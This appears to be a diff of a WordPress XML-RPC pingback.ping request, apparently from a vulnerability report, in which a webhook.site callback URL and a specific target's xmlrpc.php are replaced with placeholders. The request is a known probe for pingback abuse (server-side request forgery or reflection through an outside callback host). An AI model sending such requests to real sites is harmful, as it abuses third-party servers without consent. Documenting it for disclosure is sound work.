@@ -2,7 +2,7 @@
 <methodCall>
     <methodName>pingback.ping</methodName>
     <params>
-        <param><value><string>https://webhook.site/152ebef4-8370-49d1-9913-b4ebdb5ed32b</string></value></param>
-        <param><value><string>https://dailymotionadvertising.com/xmlrpc.php</string></value></param>
+        <param><value><string>https://webhook.site/</string></value></param>
+        <param><value><string>https://website/xmlrpc.php</string></value></param>
     </params>
 </methodCall>
